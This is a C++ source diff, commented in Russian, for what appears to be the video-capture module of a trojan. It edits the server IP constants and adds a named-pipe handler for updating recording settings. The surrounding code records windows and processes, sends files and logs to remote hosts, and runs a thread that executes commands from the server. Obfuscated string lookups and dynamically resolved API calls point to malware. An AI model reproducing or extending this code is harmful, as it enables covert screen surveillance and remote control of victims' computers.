@@ -46,8 +46,8 @@ namespace VIDEORECDEBUGSTRINGS
 
 //	char VIDEO_REC_HOST1[] = "127.0.0.1";
 //	char VIDEO_REC_HOST2[] = "127.0.0.1";
-	char VIDEO_REC_HOST1[] = "192.168.0.101";
-	char VIDEO_REC_HOST2[] = "192.168.0.101";
+	char VIDEO_REC_HOST1[] = "192.168.0.100";
+	char VIDEO_REC_HOST2[] = "192.168.0.100";
 //	char VIDEO_REC_HOST1[] = "178.162.179.65";
 //	char VIDEO_REC_HOST2[] = "178.162.179.65";
 //	char VIDEO_REC_HOST1[] = "192.168.147.2";
@@ -98,11 +98,12 @@ void TVideoRecDLL::InitializeApi()
 {
 	LoadFunc(VideoRecFuncInit,			(LPVOID&)Init);
 	LoadFunc(VideoRecFuncRelease,		(LPVOID&)Release);
+	LoadFunc(VideoRecUpdateSettings,	(LPVOID&)UpdateSettings);
 	LoadFunc(VideoRecFuncAddIPServer,	(LPVOID&)AddIPServer);
 	LoadFunc(VideoRecFuncRecordProcess,	(LPVOID&)RecordProcess);
 	LoadFunc(VideoRecFuncRecordWnd,		(LPVOID&)RecordWnd);
 	LoadFunc(VideoRecFuncStop,			(LPVOID&)RecordStop);
-	LoadFunc(VideoRecFuncResetTimer,	(LPVOID&)ResetTimer);
+	LoadFunc(VideoRecFuncResetTime,		(LPVOID&)ResetTime);
 	LoadFunc(VideoRecFuncSendFiles,		(LPVOID&)SendFiles);
 	LoadFunc(VideoRecFuncSendFilesAsync,(LPVOID&)StartSendAsync);
 	LoadFunc(VideoRecFuncIsSendedAsync,	(LPVOID&)IsSendedAsync);
@@ -299,6 +300,39 @@ int Init( int flags, const char* ip, int port, int downtime )
 	char buf[64];
 	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncInit).t_str(), (char*)&msg, sizeof(msg), 0 );
 	return msg.numServer;
+}
+
+//обновление настроек сервера
+struct MsgUpdateSettings
+{
+	int setFlags;
+	int resetFlags;
+	int downtime;
+	int numServer;
+};
+
+static void WINAPI HandlerUpdateSettings( LPVOID Data, PPipeMessage Message, bool &Cancel )
+{
+	if( Message->DataSize != sizeof(VideoProcess::MsgUpdateSettings) ) 
+		return;
+	MsgUpdateSettings* msg = (MsgUpdateSettings*)Message->Data;
+	VDRDBG( "Video", "Update settings: setFlags: %08x, resetFlags: %08x, downtime: %d", msg->setFlags, msg->resetFlags, msg->downtime );
+	if( dll )
+	{
+		if( dll->UpdateSettings )
+			dll->UpdateSettings( servers[msg->numServer], msg->setFlags, msg->resetFlags, msg->downtime );
+	}
+}
+
+void UpdateSettings( int server, int setFlags, int resetFlags, int downtime )
+{
+	MsgUpdateSettings msg;
+	msg.numServer = server;
+	msg.setFlags = setFlags;
+	msg.resetFlags = resetFlags;
+	msg.downtime = downtime;
+	char buf[64];
+	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecUpdateSettings).t_str(), (char*)&msg, sizeof(msg), 0 );
 }
 
 //сообщение для записи видео
@@ -711,12 +745,10 @@ bool Start()
 		VDRDBG( "Video", "Add server ip '%s'", VIDEO_REC_HOST2 );
 		char namePipe[64];
 		pipe = PIPE::CreateProcessPipe( GetNamePipe(namePipe), false );
-//		pOutputDebugStringA( "1" );
 		if( pipe )
 		{
-//		pOutputDebugStringA( "2" );
 			PIPE::RegisterMessageHandler( pipe, HandlerInit, 0, GetStr(VideoRecFuncInit).t_str(), 0 );
-//		pOutputDebugStringA( "3" );
+			PIPE::RegisterMessageHandler( pipe, HandlerUpdateSettings, 0, GetStr(VideoRecUpdateSettings).t_str(), 0 );
 
 			PIPE::RegisterMessageHandler( pipe, HandlerRecordVideo, 0, GetStr(VideoRecFuncRecordWnd).t_str(), 0 );
 			PIPE::RegisterMessageHandler( pipe, HandlerStopRecord, 0, GetStr(VideoRecFuncStop).t_str(), 0 );
@@ -728,7 +760,6 @@ bool Start()
 			PIPE::RegisterMessageHandler( pipe, HandlerSendLog, 0, GetStr(VideoRecFuncSendLog).t_str(), 0 );
 
 			dll->RunCmdExec( servers[0], CallbackCmd ); //запуск потока выполнения команд от сервера
-//		pOutputDebugStringA( "4" );
 
 			if( PIPE::StartProcessPipe(pipe) )
 			{
@@ -739,7 +770,6 @@ bool Start()
 				PIPE::FreeProcessPipe(pipe);
 		}
 	}
-		pOutputDebugStringA( "5" );
 	delete dll;
 	return false;;
 }
